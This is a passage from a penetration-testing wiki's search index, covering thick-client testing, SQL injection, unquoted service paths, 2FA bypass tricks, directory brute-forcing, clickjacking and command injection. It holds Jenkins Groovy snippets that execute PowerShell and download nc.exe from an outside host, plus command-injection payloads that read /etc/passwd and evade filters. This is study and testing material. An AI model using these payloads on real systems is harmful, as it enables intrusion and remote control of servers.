adoption of secure coding practices.</p> </li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/information-gathering/","title":"Information Gathering","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/information-gathering/#information-gathering","title":"Information Gathering","text":"<p>Effective information gathering lays the foundation for a successful penetration testing engagement, providing insights into the target application's architecture, network infrastructure, technology stack, and application workflow. Here are key aspects to consider during the information gathering phase:</p>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/information-gathering/#1-application-architecture","title":"1. Application Architecture","text":"<p>Understanding the architecture of the application is crucial for identifying potential attack vectors:</p> <ul> <li>Two-Tier or Three-Tier Architecture: Determine whether the application operates on a client-server model (two-tier) or includes an intermediary application server (three-tier). This knowledge helps prioritize attack surfaces, such as APIs or direct database access.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/information-gathering/#2-network-analysis","title":"2. Network Analysis","text":"<p>Performing network analysis during installation or operation can reveal valuable information:</p> <ul> <li> <p>Traffic Observation: Monitor network traffic to identify any sensitive information transmitted in plaintext, such as credentials or proprietary data.</p> </li> <li> <p>Destination IP and Routing: Note destination IP addresses and understand the routing mechanisms to map the data flow within the network. This understanding helps widen the attack surface and identify potential chokepoints or critical infrastructure.</p> </li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/information-gathering/#3-technology-stack","title":"3. Technology Stack","text":"<p>Identifying the technologies and versions used in the application stack is essential for targeting known vulnerabilities:</p> <ul> <li> <p>Tools like DetectItEasy: Utilize tools like DetectItEasy to analyze binaries and identify the programming language, frameworks, and libraries used.</p> </li> <li> <p>Vulnerability Assessment: Check if the versions used are vulnerable to any known CVEs (Common Vulnerabilities and Exposures) and prioritize them for further exploitation.</p> </li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/information-gathering/#4-application-workflow","title":"4. Application Workflow","text":"<p>Understanding the application's workflow is key to uncovering unique vulnerabilities and exploitation opportunities:</p> <ul> <li> <p>Business Logic Analysis: Gain insights into the application's business logic and unique functionalities to identify potential vulnerabilities or misuse of features.</p> </li> <li> <p>Feature or Function Exploitation: Exploit weaknesses in the application's features or functions by manipulating the workflow or abusing functionality to achieve unauthorized access or privilege escalation.</p> </li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/lack-of-code-obfuscation/","title":"Impact of Lack of Code Obfuscation","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/lack-of-code-obfuscation/#impact-of-lack-of-code-obfuscation","title":"Impact of Lack of Code Obfuscation","text":"<p>Failing to obfuscate code during the compilation process can expose sensitive information and increase the likelihood of successful reverse engineering by attackers. Here's how the lack of code obfuscation can impact the security of an application:</p>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/lack-of-code-obfuscation/#1-code-decompilation","title":"1. Code Decompilation","text":"<p>Attackers can easily decompile the application using tools like JD GUI and Dnspy, revealing the underlying source code:</p> <p>Code Decompilation: </p> <p>In the screenshot above, the source code of the Damn Vulnerable Thick Client App (DVTA) is decompiled using Dnspy. This exposes the application's logic, sensitive information, and potential vulnerabilities to attackers.</p>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/lack-of-code-obfuscation/#2-exposure-of-sensitive-information","title":"2. Exposure of Sensitive Information","text":"<ul> <li>Sensitive Data Exposure: Unobfuscated code may contain hardcoded credentials, API keys, or other sensitive information, which can be exploited by attackers to gain unauthorized access to systems or data.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/lack-of-code-obfuscation/#3-reverse-engineering","title":"3. Reverse Engineering","text":"<ul> <li>Understanding Application Logic: Attackers can analyze the decompiled code to understand the application's logic and behavior, facilitating the identification of vulnerabilities and exploitation techniques.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/lack-of-code-obfuscation/#4-vulnerability-exploitation","title":"4. Vulnerability Exploitation","text":"<ul> <li>Identification of Weaknesses: Exposed source code makes it easier for attackers to identify vulnerabilities such as insecure coding practices, input validation flaws, or insecure cryptographic implementations.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/lack-of-code-obfuscation/#mitigation-strategies","title":"Mitigation Strategies","text":"<p>To mitigate the risks associated with lack of code obfuscation, consider implementing the following strategies:</p> <ul> <li> <p>Code Obfuscation: Utilize code obfuscation techniques to obscure the application's logic and make reverse engineering more challenging for attackers.</p> </li> <li> <p>Sensitive Data Protection: Avoid hardcoding sensitive information in the source code and use secure storage mechanisms such as environment variables or secure configuration files.</p> </li> <li> <p>Static Code Analysis: Conduct regular static code analysis to identify and remediate security vulnerabilities before deployment.</p> </li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/memory-analysis/","title":"Memory Analysis and File Permissions","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/memory-analysis/#memory-analysis-and-file-permissions","title":"Memory Analysis and File Permissions","text":"<p>Conducting memory analysis and ensuring appropriate file permissions are critical aspects of assessing application security. Let's delve into these aspects:</p>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/memory-analysis/#1-memory-analysis","title":"1. Memory Analysis","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/memory-analysis/#sensitive-information-detection","title":"Sensitive Information Detection","text":"<ul> <li>Tools like <code>strings</code> or <code>flarefoss</code>: Utilize tools such as <code>strings</code> or <code>flarefoss</code> to check if sensitive information is written into memory. These tools can help identify plaintext passwords, API keys, or other sensitive data stored in memory.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/memory-analysis/#log-file-inspection","title":"Log File Inspection","text":"<ul> <li>Log File Content: Before and after testing the application, redirect its output to a log file (<code>logs.txt</code>) using the command <code>example.exe &gt; logs.txt</code>. Afterwards, inspect the log file for any sensitive information written during the application's execution, which could potentially be exploited by attackers.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/memory-analysis/#2-file-permissions","title":"2. File Permissions","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/memory-analysis/#security-of-installed-files","title":"Security of Installed Files","text":"<ul> <li>File Manipulation Permissions: Ensure that files created during installation have appropriate permissions set to prevent unauthorized modification. These files should typically not have write permissions to prevent tampering by attackers or malicious applications.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/memory-analysis/#application-data-files","title":"Application Data Files","text":"<ul> <li>Data File Permissions: Files storing application-related information should have restricted permissions to prevent unauthorized access or modification. This mitigates the risk of attackers tampering with critical application data or interfering with the file system of other applications.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/memory-analysis/#3-protection-against-flooding-attacks","title":"3. Protection Against Flooding Attacks","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/memory-analysis/#input-handling","title":"Input Handling","text":"<ul> <li>Input Validation: Assess whether the application handles input appropriately to mitigate flooding attacks. Proper input validation helps prevent memory corruption, buffer overflow, and other vulnerabilities that can arise from processing large volumes of data.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/memory-analysis/#reference","title":"Reference","text":"<ul> <li>https://learn.microsoft.com/en-us/sysinternals/downloads/strings</li> <li>https://github.com/mandiant/flare-floss</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/registry-monitoring/","title":"Registry Monitoring and Permissions","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/registry-monitoring/#registry-monitoring-and-permissions","title":"Registry Monitoring and Permissions","text":"<p>Monitoring the Windows registry and ensuring appropriate permissions are crucial for maintaining the security of applications. Let's explore these aspects:</p>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/registry-monitoring/#1-registry-monitoring","title":"1. Registry Monitoring","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/registry-monitoring/#tool-regshot","title":"Tool: <code>regshot</code>","text":"<ul> <li>Monitoring Changes: Utilize tools like <code>regshot</code> to monitor changes to the registry by capturing snapshots before and after an application's execution. This allows easy identification of any modifications made to the registry, including the storage of sensitive information.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/registry-monitoring/#sensitive-information-detection","title":"Sensitive Information Detection","text":"<ul> <li>Registry Inspection: After running the application, inspect the registry for any stored sensitive information, such as credentials or configuration settings. Any sensitive data stored in the registry should be encrypted or securely managed to prevent unauthorized access.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/registry-monitoring/#privilege-escalation-checks","title":"Privilege Escalation Checks","text":"<ul> <li>Role Information Manipulation: If role-based information is stored in the registry, attempt to manipulate these settings to assess if privilege escalation is possible. Unauthorized elevation of privileges due to insecure registry settings can lead to significant security risks.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/registry-monitoring/#2-registry-permissions","title":"2. Registry Permissions","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/registry-monitoring/#security-considerations","title":"Security Considerations","text":"<ul> <li>Write Permissions: Review the permissions set on registry keys to ensure that only authorized users or processes have write access. Write permissions to sensitive registry keys can be exploited by attackers to modify critical system settings or install malicious software.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/registry-monitoring/#permission-assessment","title":"Permission Assessment","text":"<ul> <li>Dangerous Write Permissions: Identify registry keys with overly permissive write permissions and remediate them to restrict access. Registry keys with write permissions should be carefully managed to prevent unauthorized modifications.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/sql-injection/","title":"SQL Injection","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/sql-injection/#sql-injection","title":"SQL Injection","text":"<p>SQL injection attacks pose a significant threat to the security of Windows thick client applications, especially those that interact with an SQL server to manage data storage. Here's how SQL injection vulnerabilities can be exploited and mitigated in such applications:</p>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/sql-injection/#1-understanding-sql-injection","title":"1. Understanding SQL Injection","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/sql-injection/#attack-vector","title":"Attack Vector","text":"<ul> <li>Injection of SQL Queries: Attackers exploit SQL injection vulnerabilities by injecting malicious SQL queries into user input fields or parameters passed to SQL queries.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/sql-injection/#impact","title":"Impact","text":"<ul> <li>Data Exposure: Successful SQL injection can lead to the exposure of sensitive data stored in the database, such as usernames, passwords, or confidential information.</li> <li>Data Manipulation: Attackers can manipulate database data by performing unauthorized operations such as insertion, modification, or deletion of records.</li> <li>System Compromise: In extreme cases, SQL injection can lead to the execution of arbitrary SQL commands or even commands on the underlying operating system, leading to complete system compromise.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/sql-injection/#2-vulnerable-authentication-mechanisms","title":"2. Vulnerable Authentication Mechanisms","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/sql-injection/#login-functionality","title":"Login Functionality","text":"<ul> <li>Authentication Bypass: If the login functionality of the application is vulnerable to SQL injection, attackers can bypass authentication and gain unauthorized access to the application.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/sql-injection/#3-mitigation-strategies","title":"3. Mitigation Strategies","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/sql-injection/#input-validation-and-parameterized-queries","title":"Input Validation and Parameterized Queries","text":"<ul> <li>Input Sanitization: Implement robust input validation to sanitize user input and prevent the injection of malicious SQL queries.</li> <li>Parameterized Queries: Use parameterized queries or prepared statements to separate SQL code from user input, preventing SQL injection attacks.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/sql-injection/#least-privilege-principle","title":"Least Privilege Principle","text":"<ul> <li>Database Permissions: Limit database user permissions to only necessary operations, reducing the impact of successful SQL injection attacks.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/sql-injection/#regular-security-audits","title":"Regular Security Audits","text":"<ul> <li>Code Review: Conduct regular code reviews to identify and remediate SQL injection vulnerabilities in the application codebase.</li> <li>Penetration Testing: Perform penetration testing to simulate real-world attack scenarios and identify potential SQL injection vulnerabilities.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/sql-injection/#4-application-architecture-considerations","title":"4. Application Architecture Considerations","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/sql-injection/#2-tier-vs-3-tier-applications","title":"2-Tier vs. 3-Tier Applications","text":"<ul> <li>SQL Server Usage: In 2-tier applications utilizing an SQL server for data storage, the authentication mechanism may be directly vulnerable to SQL injection.</li> <li>API Usage: In 3-tier applications utilizing APIs, vulnerabilities may exist in the API layer that can be exploited via SQL injection.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/testing-approach/","title":"Testing Approach","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/testing-approach/#testing-approach","title":"Testing Approach","text":"<p>When conducting security testing for thick client applications, it's essential to follow a structured approach to thoroughly assess potential vulnerabilities. Here's a comprehensive testing approach:</p>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/testing-approach/#1-starting-checks-enumeration","title":"1. Starting Checks (Enumeration)","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/testing-approach/#application-architecture","title":"Application Architecture","text":"<ul> <li>Understand the application's architecture, including client-server communication, data flow, and business logic.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/testing-approach/#platform-mapping","title":"Platform Mapping","text":"<ul> <li>Map out the underlying platform and infrastructure supporting the application to identify potential attack vectors and dependencies.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/testing-approach/#languages-and-frameworks","title":"Languages and Frameworks","text":"<ul> <li>Identify the languages and frameworks used in the application, as vulnerabilities may exist in specific language implementations or framework components.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/testing-approach/#network-connection-analysis","title":"Network Connection Analysis","text":"<ul> <li>Use tools like Wireshark or TCPview to monitor network connections established by the application and analyze the data flow for potential security risks.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/testing-approach/#2-common-tools-and-vulnerabilities","title":"2. Common Tools and Vulnerabilities","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/testing-approach/#tools","title":"Tools","text":"<ul> <li>CFF Explorer</li> <li> <p>Utilize CFF Explorer to analyze executable files, inspect PE headers, and identify embedded resources or vulnerabilities.</p> </li> <li> <p>Wireshark/TCPview</p> </li> <li> <p>Monitor network traffic using Wireshark or TCPview to identify potential security issues, such as plaintext transmission of sensitive data or communication with suspicious domains.</p> </li> <li> <p>Procmon</p> </li> <li> <p>Use Procmon to monitor system activity, including file system, registry, and process activity, to identify potential malicious behavior or vulnerabilities.</p> </li> <li> <p>Detect It Easy</p> </li> <li> <p>Analyze binary files using Detect It Easy to identify languages, frameworks, and potential vulnerabilities, aiding in the understanding of application structure and security risks.</p> </li> <li> <p>Echo Mirage</p> </li> <li>Employ Echo Mirage to simulate various network attacks and analyze application responses for potential vulnerabilities or weaknesses in network communication.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/unquoted-service-paths/","title":"Unquoted Service Paths Vulnerability","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/unquoted-service-paths/#unquoted-service-paths-vulnerability","title":"Unquoted Service Paths Vulnerability","text":"<p>Unquoted service paths vulnerability occurs when a service is created with an executable path containing spaces and isn't enclosed within quotes. This vulnerability can be exploited by attackers to gain elevated privileges on the system. Here's how to identify and mitigate unquoted service paths vulnerability:</p>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/unquoted-service-paths/#1-identification","title":"1. Identification","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/unquoted-service-paths/#using-wmic-command","title":"Using WMIC Command","text":"<ul> <li>Execute the following WMIC command to identify services with unquoted executable paths:   <pre><code>wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\" | findstr /i /v \"\"\"\n</code></pre></li> <li>This command lists services set to start automatically (<code>startmode</code> is \"auto\") and filters out services whose paths include \"c:\\windows\\\" or are enclosed in quotes.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/unquoted-service-paths/#vulnerable-service-example","title":"Vulnerable Service Example","text":"<ul> <li>Example: </li> <li>The screenshot illustrates an example of a vulnerable service \"Sandboxie-Plus v0.7.4\" with an unquoted service path.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/unquoted-service-paths/#2-risk-assessment","title":"2. Risk Assessment","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/unquoted-service-paths/#folder-permissions","title":"Folder Permissions","text":"<ul> <li>After identifying vulnerable services, assess folder permissions associated with the service executable path.</li> <li>If low-privileged users have writeable access to the folder containing the executable, privilege escalation may be possible.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/unquoted-service-paths/#3-mitigation-strategies","title":"3. Mitigation Strategies","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/unquoted-service-paths/#enclose-paths-in-quotes","title":"Enclose Paths in Quotes","text":"<ul> <li>Enclose service paths containing spaces within quotes during service creation to prevent potential exploitation of unquoted service paths vulnerability.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/unquoted-service-paths/#fix-permissions","title":"Fix Permissions","text":"<ul> <li>Review and adjust folder permissions associated with vulnerable service executable paths to restrict write access to low-privileged users.</li> </ul>"},{"location":"Pentesting/Web%20Application/2fa-bypass/","title":"2FA bypass","text":""},{"location":"Pentesting/Web%20Application/2fa-bypass/#2fa-bypass","title":"2FA bypass","text":""},{"location":"Pentesting/Web%20Application/2fa-bypass/#what-is-2fa","title":"What is 2FA?","text":"<p>Two-factor authentication, or 2FA, is a safety measure that requires users to confirm their identity using two separate authentication factors. Usually, these factors consist of two things: something the person possesses (like a security token) and something they know (like a password). By making it more difficult for unauthorized users to access accounts, even if they have the password, it provides another layer of security. By using this technique, the potential for password theft or breaches leading to illegal access is reduced.</p>"},{"location":"Pentesting/Web%20Application/2fa-bypass/#two-factor-authentication-implementation-method","title":"Two-Factor Authentication implementation method","text":"<ul> <li> <p>SMS-based 2FA: Users receive a one-time verification code via SMS on their registered mobile phone number, which they enter along with their password during login.</p> </li> <li> <p>Authenticator App-based 2FA: Users generate one-time verification codes using an authenticator app installed on their smartphone, such as Google Authenticator, Microsoft Authenticator, or Authy.</p> </li> <li> <p>Email-based 2FA: Users receive a one-time verification code via email, which they enter along with their password during login.</p> </li> <li> <p>Hardware Tokens: Users use a physical device, such as a USB token or smart card, to generate one-time verification codes.</p> </li> <li> <p>Biometric-based 2FA: Users verify their identity using biometric data, such as fingerprints, facial recognition, or voice recognition.</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/2fa-bypass/#bypass-methods","title":"Bypass Methods","text":"<ul> <li> <p>Response Manipulation: In response if \"success\":false, change it to \"success\":true</p> </li> <li> <p>Status Code Manipulation: If Status Code is 4xx, try to change it to 200 OK and see if it bypass restrictions.</p> </li> <li> <p>2FA Code Leakage in Response: Check the response of the 2FA Code Triggering Request to see if the code is leaked.</p> </li> <li> <p>JS File Analysis: Rare but some JS Files may contain info about the 2FA Code, worth giving a shot.</p> </li> <li> <p>2FA Code Reusability: Same code can be reused.</p> </li> <li> <p>Lack of Brute-Force Protection: Possible to brute-force any length 2FA Code.</p> </li> <li> <p>Missing 2FA Code Integrity Validation: Code for any user acc can be used to bypass the 2FA</p> </li> <li> <p>CSRF on 2FA Disabling: No CSRF Protection on disabling 2FA, also there is no auth confirmation.</p> </li> <li> <p>Password Reset Disable 2FA: 2FA gets disabled on password change/email change.</p> </li> <li> <p>Backup Code Abuse: Bypassing 2FA by abusing the Backup code feature. Use the above-mentioned techniques to bypass Backup Code to remove/reset 2FA restrictions.</p> </li> <li> <p>Clickjacking on 2FA Disabling Page: Iframing the 2FA Disabling page and social engineering victim to disable the 2FA.</p> </li> <li> <p>Enabling 2FA doesn't expire Previously active Sessions: If the session is already hijacked and there is a session timeout vuln.</p> </li> <li> <p>Time Based OTP bypass technique: Usage of old TOTP , usage old TOTP response also.</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/2fa-bypass/#bypass-mindmap","title":"Bypass Mindmap","text":"<ul> <li>https://www.mindmeister.com/1736437018?t=SEeZOmvt01</li> </ul>"},{"location":"Pentesting/Web%20Application/Directory%20bruteforcing-fingerprinting/","title":"Web Application Directory bruteforcing / fingerprinting","text":""},{"location":"Pentesting/Web%20Application/Directory%20bruteforcing-fingerprinting/#web-application-directory-bruteforcing-fingerprinting","title":"Web Application Directory bruteforcing / fingerprinting","text":""},{"location":"Pentesting/Web%20Application/Directory%20bruteforcing-fingerprinting/#what-is-directory-bruteforcing","title":"What is Directory Bruteforcing?","text":"<p>Directory brute-forcing is a technique used in cybersecurity to systematically guess and test directories or folders within a web server or application. This method involves trying various directory names or paths in an attempt to discover hidden or unprotected resources. By using automated tools or scripts, attackers can exhaustively search for sensitive files, configuration files, or directories containing valuable information. Directory brute-forcing poses a significant security risk as it can lead to unauthorized access, data breaches, or exploitation of vulnerabilities within the target system. Organizations often employ measures like access controls, web application firewalls, and security monitoring to mitigate the risks associated with directory brute-forcing attacks.</p>"},{"location":"Pentesting/Web%20Application/Directory%20bruteforcing-fingerprinting/#what-is-fingerprinting","title":"What is Fingerprinting?","text":"<p>Fingerprinting is the systematic identification of software, frameworks, libraries, and configurations used to build a website or web service. It's akin to recognizing the unique \"fingerprint\" left behind by specific technologies. This process typically involves analyzing HTTP headers, response codes, URL structures, JavaScript files, and other artifacts to deduce details about the underlying infrastructure and software stack. Fingerprinting aids in understanding potential vulnerabilities, compatibility issues, and the overall security posture of web applications.</p>"},{"location":"Pentesting/Web%20Application/Directory%20bruteforcing-fingerprinting/#tools-and-commands","title":"Tools and Commands","text":"<pre><code>gobuster -u http://ip -w /usr/share/wordlists/dirb/small.txt -s 307,200,204,301,302,403 -x txt,sh,cgi,pl -t 50gobuster -u http://ip/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -s 307,200,204,301,302,403 -x txt,sh,cgi,pl -t 50gobuster -u x.x.x.x -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 20gobuster -u x.x.x.x -w /usr/share/seclists/Discovery/Web_Content/quickhits.txt -t 20gobuster -u x.x.x.x -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 20 -x .txt,.phpgobuster -s \"200,204,301,302,307,403,500\" -w /usr/share/seclists/Discovery/Web_Content/common.txt -u http://gobuster -s \"200,204,301,302,307,403,500\"  -u http://XXXX -wgobuster -u http://ip -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -t 40Gobuster comprehensive directory bustinggobuster -s 200,204,301,302,307,403 -u iop -w /usr/share/seclists/Discovery/Web_Content/big.txt -t 80 -a 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'Gobuster quick directory bustinggobuster -u ip -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -a Linux\n</code></pre> <pre><code>wfuzz -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 400,404,500 http://x.x.x.x/FUZZwfuzz -w /usr/share/seclists/Discovery/Web_Content/quickhits.txt --hc 400,404,500 http://x.x.x.x/FUZZ wfuzz -c -z range,1-65535 --hl=2 http://ip:60000/url.php?path=1 27.0.0.1:FUZZwfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hh 158607 http://bart.htb/FUZZ\u200b\n</code></pre> <pre><code> nmap --script http-form-fuzzer --script-args 'http-form-fuzzer.targets={1={path=/},2={path=/register.html}}' -p 80 $ip\n</code></pre> <pre><code>cmsmap.py https://x.x.x.x\n</code></pre> <pre><code>WebdavTest incorrect permissions:\u200b$ cadaver http://$ip$ davtest http://$ip\u200b\n</code></pre> <pre><code>Jenking groovy codeTesting to see if we have code execution\u2026\u200bdef sout = new StringBuffer(), serr = new StringBuffer()def proc = 'powershell.exe $PSVERSIONTABLE'.execute()proc.consumeProcessOutput(sout, serr)proc.waitForOrKill(1000)println \"out&gt; $sout err&gt; $serr\"\n</code></pre> <pre><code>NC upload in jenkin Server\u200bdef process = \"powershell -command Invoke-WebRequest 'http://ip/nc.exe' -OutFile nc.exe\".execute();println(\"${process.text}\");\n</code></pre>"},{"location":"Pentesting/Web%20Application/clickjacking/","title":"Clickjacking","text":""},{"location":"Pentesting/Web%20Application/clickjacking/#clickjacking","title":"Clickjacking","text":""},{"location":"Pentesting/Web%20Application/clickjacking/#what-is-clickjacking","title":"What is Clickjacking?","text":"<p>Clickjacking is an attack that tricks a user into clicking a webpage element which is invisible or disguised as another element. This can cause users to unwittingly download malware, visit malicious web pages, provide credentials or sensitive information, transfer money, or purchase products online.</p>"},{"location":"Pentesting/Web%20Application/clickjacking/#poc","title":"POC","text":"<pre><code>&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;This website is vulnerable to clickjacking&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;iframe style=\"height: 500px; width: 500px;\" src=\"https://&lt;companyname&gt;\"&gt;&lt;/iframe&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"Pentesting/Web%20Application/clickjacking/#tools","title":"Tools","text":"<ul> <li> <p>https://portswigger.net/burp/documentation/desktop/tools/clickbandit</p> </li> <li> <p>https://gf.dev/x-frame-options-test</p> </li> <li> <p>https://github.com/D4Vinci/Clickjacking-Tester</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/clickjacking/#references","title":"References","text":"<ul> <li> <p>https://portswigger.net/web-security/clickjacking</p> </li> <li> <p>https://www.netsparker.com/blog/web-security/clickjacking-attacks/</p> </li> <li> <p>https://javascript.info/clickjacking</p> </li> <li> <p>https://medium.com/@raushanraj_65039/google-clickjacking-6a04132b918a</p> </li> <li> <p>https://medium.com/@osamaavvan/1800-worth-clickjacking-1f92e79d0414</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/cms/","title":"CMS Recon","text":""},{"location":"Pentesting/Web%20Application/cms/#cms-recon","title":"CMS Recon","text":""},{"location":"Pentesting/Web%20Application/cms/#what-is-cms","title":"What is CMS?","text":"<p>A Content Management System (CMS) is a software application used to create, manage, and modify digital content on websites without requiring extensive technical knowledge. It provides users with an intuitive interface to add, edit, and delete content such as text, images, videos, and other multimedia elements. CMS platforms offer various features including user management, publishing workflows, version control, and plugin/extensions support for customization. Popular examples include WordPress, Joomla, and Drupal, empowering users to efficiently maintain and update their web presence.</p>"},{"location":"Pentesting/Web%20Application/cms/#cms-reconnaissance","title":"CMS Reconnaissance","text":"<p>Performing CMS reconnaissance is crucial for identifying vulnerabilities, customizing attack vectors, exploiting known weaknesses, mapping the attack surface, understanding dependencies, detecting hidden functionalities, and gathering intelligence about the target environment. By uncovering the specific CMS being used, along with its configurations, plugins, and extensions, reconnaissance enables a more targeted and comprehensive approach to penetration testing, ultimately enhancing the ability to identify and mitigate security risks within web applications powered by CMS platforms.</p>"},{"location":"Pentesting/Web%20Application/cms/#tools","title":"Tools","text":"<ul> <li> <p>https://github.com/wpscanteam/wpscan</p> </li> <li> <p>https://github.com/droope/droopescan</p> </li> <li> <p>https://github.com/hblankenship/joomscan</p> </li> <li> <p>https://github.com/anouarbensaad/vulnx</p> </li> <li> <p>https://github.com/0ang3el/aem-hacker</p> </li> <li> <p>https://github.com/Dionach/CMSmap</p> </li> <li> <p>https://github.com/Tuhinshubhra/CMSeeK</p> </li> <li> <p>https://github.com/immunIT/drupwn</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/command-injection/","title":"Command Injection","text":""},{"location":"Pentesting/Web%20Application/command-injection/#command-injection","title":"Command Injection","text":""},{"location":"Pentesting/Web%20Application/command-injection/#what-is-command-injection","title":"What is Command injection?","text":"<p>Command injection vulnerabilities occur when user-controllable data is processed by a shell command interpreter, the information you submitted to the application was used as part of a command run directly by the system. Command injection vulnerabilities are serious findings, as they allow an attacker to execute commands on the underlying system hosting the web application.</p>"},{"location":"Pentesting/Web%20Application/command-injection/#general-commands","title":"General Commands","text":"Purpose of command Linux Windows Name of current user <code>whoami</code> <code>whoami</code> Operating system <code>uname -a</code> <code>ver</code> Network configuration <code>ifconfig</code> <code>ipconfig /all</code> Network connections <code>netstat -an</code> <code>netstat -an</code> Running processes <code>ps -ef</code> <code>tasklist</code>"},{"location":"Pentesting/Web%20Application/command-injection/#exploiting-the-command-injection","title":"Exploiting the command injection","text":""},{"location":"Pentesting/Web%20Application/command-injection/#basic-commands","title":"Basic commands","text":"<pre><code>cat /etc/passwd\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\n</code></pre>"},{"location":"Pentesting/Web%20Application/command-injection/#chaining-commands","title":"Chaining commands","text":"<pre><code>original_cmd_by_server ; ls\noriginal_cmd_by_server &amp;&amp; ls\noriginal_cmd_by_server | ls\noriginal_cmd_by_server || ls    Only if the first cmd fail\n</code></pre>"},{"location":"Pentesting/Web%20Application/command-injection/#inside-a-command","title":"Inside a command","text":"<pre><code>original_cmd_by_server `cat /etc/passwd`\noriginal_cmd_by_server $(cat /etc/passwd)\n</code></pre>"},{"location":"Pentesting/Web%20Application/command-injection/#filter-bypasses","title":"Filter Bypasses","text":""},{"location":"Pentesting/Web%20Application/command-injection/#bypass-without-space","title":"Bypass without space","text":""},{"location":"Pentesting/Web%20Application/command-injection/#works-on-linux-only","title":"Works on Linux only.","text":"<pre><code>swissky@crashlab:~/Www$ cat&lt;/etc/passwd\nroot:x:0:0:root:/root:/bin/bash\n\nswissky@crashlab\u25b8 ~ \u25b8 $ 